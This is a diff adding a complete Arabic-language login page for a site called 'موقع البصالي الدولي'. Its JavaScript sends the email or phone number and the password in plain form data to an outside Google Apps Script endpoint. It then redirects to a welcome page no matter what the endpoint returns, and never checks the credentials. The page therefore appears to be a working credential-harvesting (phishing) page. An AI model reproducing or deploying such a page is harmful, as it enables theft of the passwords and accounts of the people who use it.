@@ -1,0 +1,145 @@
+﻿<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <title>موقع البصالي الدولي</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@600&display=swap');
+
+    body {
+      font-family: 'Cairo', sans-serif;
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #fff;
+      position: relative;
+      overflow: hidden;
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: url('https://images.unsplash.com/photo-1522199755839-a2bacb67c546?auto=format&fit=crop&w=1470&q=80') no-repeat center center fixed;
+      background-size: cover;
+      filter: blur(8px) brightness(0.6);
+      z-index: -1;
+    }
+
+    .title {
+      font-size: 32px;
+      margin-bottom: 30px;
+      color: #00e5ff;
+      text-shadow: 2px 2px 6px rgba(0, 0, 0, 0.6);
+      text-align: center;
+    }
+
+    form {
+      background: rgba(255, 255, 255, 0.15);
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
+      width: 320px;
+      backdrop-filter: blur(10px);
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 14px;
+      color: #fff;
+      text-shadow: 1px 1px 2px #000;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: none;
+      border-radius: 8px;
+      background-color: rgba(255, 255, 255, 0.9);
+      font-size: 14px;
+      color: #333;
+      box-sizing: border-box;
+    }
+
+    input::placeholder {
+      color: #999;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      background-color: #ff4081;
+      color: #fff;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      box-shadow: 0 4px 10px rgba(255, 64, 129, 0.6);
+    }
+
+    button:hover {
+      background-color: #e91e63;
+    }
+
+    #response {
+      margin-top: 15px;
+      font-size: 14px;
+      text-shadow: 1px 1px 2px #000;
+      min-height: 20px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <form id="loginForm">
+    <h1 class="title">موقع البصالي الدولي</h1>
+
+    <label for="email">البريد الإلكتروني أو رقم الهاتف:</label>
+    <input type="text" id="email" name="email" required placeholder="example@gmail.com" />
+
+    <label for="password">كلمة المرور:</label>
+    <input type="password" id="password" name="password" required placeholder="********" />
+
+    <button type="submit">تسجيل الدخول</button>
+
+    <p id="response"></p>
+  </form>
+
+  <script>
+    const scriptURL = "https://script.google.com/macros/s/AKfycbxxuGvzzATtk3zhQRt-gWH9Nfpnva18bgeI_QVpP82ywknknHYSEaK4AzFKo6_0wKGSnA/exec";
+
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const form = this;
+      const formData = new FormData(form);
+
+      if (!form.email.value || !form.password.value) {
+        document.getElementById("response").innerText = "⚠️ الرجاء تعبئة جميع الحقول.";
+        return;
+      }
+
+      fetch(scriptURL, {
+        method: "POST",
+        body: formData,
+      })
+        .then(response => response.text())
+        .then(result => {
+          // التوجيه إلى الصفحة التالية
+          window.location.href = "welcome.html";
+        })
+        .catch(error => {
+          document.getElementById("response").innerText = "❌ حدث خطأ أثناء تسجيل الدخول.";
+          console.error("Error!", error.message);
+        });
+    });
+  </script>
+
+</body>
+</html>
